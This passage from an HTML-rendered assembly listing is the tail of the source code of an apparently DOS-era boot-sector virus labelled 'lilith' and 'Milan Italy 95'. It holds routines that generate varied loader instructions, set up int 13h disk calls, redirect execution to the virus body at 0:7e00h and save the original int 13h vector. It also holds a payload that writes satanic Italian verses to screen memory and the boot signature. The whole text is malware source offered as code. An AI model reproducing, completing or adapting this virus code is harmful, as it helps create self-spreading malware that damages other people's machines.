                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc0">                 </span><span class="sc1">; mov ch,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_dx_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc0">                 </span><span class="sc1">; mov dx,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_dx_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc0">                 </span><span class="sc1">; mov dh,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc0">                 </span><span class="sc1">; mov dl,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_dx_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc0">                 </span><span class="sc1">; mov dl,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dl</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc0">                 </span><span class="sc1">; mov dh,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_ax_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov ax,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_al</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_ax_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02b4h</span><span class="sc0">                </span><span class="sc1">; mov ah,02h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">                 </span><span class="sc1">; mov al,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_al</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_ax_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">                 </span><span class="sc1">; mov al,</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_al</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02b4h</span><span class="sc0">                </span><span class="sc1">; mov ah,02</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">do_int13h_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

</span><span class="sc5">do_int13h_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">26h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                </span><span class="sc1">; call far es:[4ch]</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">04ch</span><span class="sc0">

</span><span class="sc5">do_int13h_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                </span><span class="sc1">; call far ss:[4ch]</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">04ch</span><span class="sc0">

</span><span class="sc5">do_int13h_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">36h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                </span><span class="sc1">; call far cs:[4ch]</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">04ch</span><span class="sc0">


</span><span class="sc5">to_virus_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                 </span><span class="sc1">; jmp</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; to virus entry point at</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; 0:7e00h, so here calc</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; offset</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">to_virus_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jmp far 0:7e00h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7e00h</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">to_virus_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">                 </span><span class="sc1">; call</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; to virus entry point at</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; 0:7e00h, so here calc</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; offset</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">to_virus_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09ah</span><span class="sc0">                    </span><span class="sc1">; call far 0:7e00h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">7e00h</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">orig13h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9A44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">332h</span><span class="sc0">                            </span><span class="sc1">; offset in vmem</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'L њ I њ L њ I њ T њ H'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">37eh</span><span class="sc0">                            </span><span class="sc1">; offset in vmem</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Tu del creato prima Donna'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3cch</span><span class="sc0">                            </span><span class="sc1">; offset in vmem</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'del Sesso Maestra infernale'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">418h</span><span class="sc0">                            </span><span class="sc1">; offset in vmem</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'accogli le Nostre dannate Carni'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">470h</span><span class="sc0">                            </span><span class="sc1">; offset in vmem</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'nel Tuo satanico Ventre'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">origin</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Milan Italy 95'</span><span class="sc0">

</span><span class="sc5">boot_mrk</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">

</span><span class="sc5">lilith</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">boot_start</span><span class="sc0">

</span></div></body>
</html>
